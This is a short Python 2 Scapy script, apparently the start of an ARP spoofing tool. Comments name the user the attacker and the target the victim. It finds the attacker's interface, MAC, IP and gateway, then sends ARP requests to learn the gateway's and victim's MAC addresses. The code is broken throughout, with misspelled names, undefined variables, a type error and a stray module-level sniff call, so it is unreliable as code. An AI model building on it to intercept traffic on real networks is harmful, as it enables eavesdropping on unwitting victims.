#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
import thread
import netifaces

def GetIface():#get InterfaceList
	inter = []
	i = 1
	for iface in netifaces.interfaces():
		inter.append(iface)
		print i+'.'+ iface
		i += 1
	num = input("interface:")
	return inter[num-1]
	
def GetMyMac(interface):#get attacker's Macadress
	interInfo = netifaces.ifaddress(interface);
	return interInfo[netifaces.AF_PACKET][0]['addr']
def GetMyIP(interface):#get attacker's IP
	interInfo = netifaces.ifaddress(interface);
	return interInfo[netifaces.AF_INET][0]['addr']
def GetMyGateway(interface):#get atteacker's GatewayIP
	return netifaces.gateways()['default'][netifaces.AF_INET][0]

def parse_args():#To get victm's IP
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP")
    return parser.parse_args()

def arp_monitor_callback(pkt):#to arp monitoring
	if ARP in pky and pkt[ARP].op in (1,2):
		return pkt.sprintf("%ARP.hwscr% %ARP.psrc%")
sniff(prn=arp_monitor_callback,filter="arp",store=0)
def main(args):
    iface = GetIface()
    MyMac = GetMyMac(iface)
    MyIP  = GetMyIP(iface)
    MyGateway = GetMyGateway(iface)
    VI_IP = args[0]
    ###gatewayMAc
    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)#make a Packet to get gateway Macadress
    while GatewayM == "":
	send(Pkt)
	GatewayM = pipe.recv()
	print GatewayM
    ###Victm MAc
    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)#make a Packet to get Victm's MacAdress 
    while V_M == "":
        send(Pkt)
        V_M = pipe.recv()
        print V_M

if __name__ == "__main__":
 main(parse_args())

